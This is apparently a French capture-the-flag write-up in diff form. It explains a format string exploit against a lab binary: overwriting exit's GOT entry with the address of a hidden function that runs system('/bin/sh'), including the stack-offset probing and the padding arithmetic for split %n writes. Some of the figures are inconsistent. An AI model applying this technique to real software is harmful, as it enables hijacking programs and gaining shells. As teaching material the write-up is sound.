@@ -1,0 +1,77 @@
+disas n : 
+   0x080484c2 <+0>:	    push   %ebp
+   0x080484c3 <+1>:	    mov    %esp,%ebp
+   0x080484c5 <+3>:	    sub    $0x218,%esp
+   0x080484cb <+9>:	    mov    0x8049848,%eax
+   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
+   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
+   0x080484dc <+26>:	lea    -0x208(%ebp),%eax -> allocation string 520
+   0x080484e2 <+32>:	mov    %eax,(%esp)
+   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt> -> buffer overflow impossible
+   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
+   0x080484f0 <+46>:	mov    %eax,(%esp)
+   0x080484f3 <+49>:	call   0x8048380 <printf@plt> -> format string attack possible
+   0x080484f8 <+54>:	movl   $0x1,(%esp)
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt> -> un exit donc pas de variable globale
+                                                        possible à écraser
+
+Cependant un info function nous révèle la présence d´une fonction.
+
+0x080484a4 <+0>:	push   %ebp
+0x080484a5 <+1>:	mov    %esp,%ebp
+0x080484a7 <+3>:	sub    $0x18,%esp
+0x080484aa <+6>:	movl   $0x80485f0,(%esp) -> x/s 0x80485f0 = 0x80485f0:	 "/bin/sh"
+0x080484b1 <+13>:	call   0x80483b0 <system@plt> -> lancement de "/bin/sh"
+0x080484b6 <+18>:	movl   $0x1,(%esp)
+0x080484bd <+25>:	call   0x8048390 <_exit@plt>
+
+On va donc faire une format string attack mais au lieu de modifier une variable globale on
+modifiera l´adresse du exit dans la GOT (global offset table) pour la remplacer par 
+l´adresse de o.
+
+Trouvons l´adresse de o :
+x o : 
+    0x80484a4 <o>:	 "..."
+
+Puis l´adresse du exit dans la GOT :
+disas 0x80483d0 : (call du exit)
+    0x080483d0 <+0>:	jmp    *0x8049838 -> addresse du jump dans la GOT
+    0x080483d6 <+6>:    push   $0x28
+    0x080483db <+11>:	jmp    0x8048370
+
+x 0x8049838 : (verification que l´adresse est bonne)
+    0x8049838 <exit@got.plt>:	 0x080483d6 -> on est bon pour la GOT
+
+Trouver le début de la stack:
+AAAAAAAA %x %x %x %x %x %x %x %x %x %x : 
+AAAAAAAA 200 b7fd1ac0 b7ff37d0 41414141 41414141 20782520 25207825 78252078 20782520 
+25207825 -> debut du buffer à 4
+
+Pour mettre notre adresse o dans la GOT il faut qu´on ecrive 134 513 828 charactere 
+(0x080484a8 = 134 513 528). Ca risque de prendre du temps donc on va décomposer en deux 
+partie et ecrire notre adresse en deux fois.
+
+1ere partie : on ecrit les lower bits 84a4. Pour cela on doit ecrire 33 956 charactere. 
+Cependant si on commence par ecrire un petit nombre, 30 on obtient 2e qui correspond à 46.
+On en deduit qu´on a un padding de 46 - 30 = 16, donc on ecrira :
+33 956 - 16 = 33 940 characteres.
+
+2eme partie : on ajoute l´adresse où ecrire + 2 (pour atteindre les higher bit) ainsi que
+la partie ecriture qui touchera cette fois le 5eme arguments (qui correspond à notre 2eme
+adresse). On commence avec 30 aussi et on obtient 84c2 qui est plus grand que 0804 que l´on
+veut. On a donc un soucis puisqu´on ne peut qu´augmenter la valeur de nos bits mais qu´on
+cherche une valeur plus petite. Le soucis est reglé facilement si on se souvient que meme
+si seulement deux bits nous interresse on a 4 bits pour ecrire :
+
+        84 c2   84 a4
+00 00   08 04
+00 01   08 04
+
+On va donc écrire plus de charactere pour faire passer le 5eme bit à 1 et faire retomber
+les 4 précedants à 0, on ve veut plus 0x0804 mais 0x10804 !
+
+0x10804 - 0x84c2 = 0x8342 (33 602) => 33 602 + 30 (padding) = 33 632
+
+
+
+
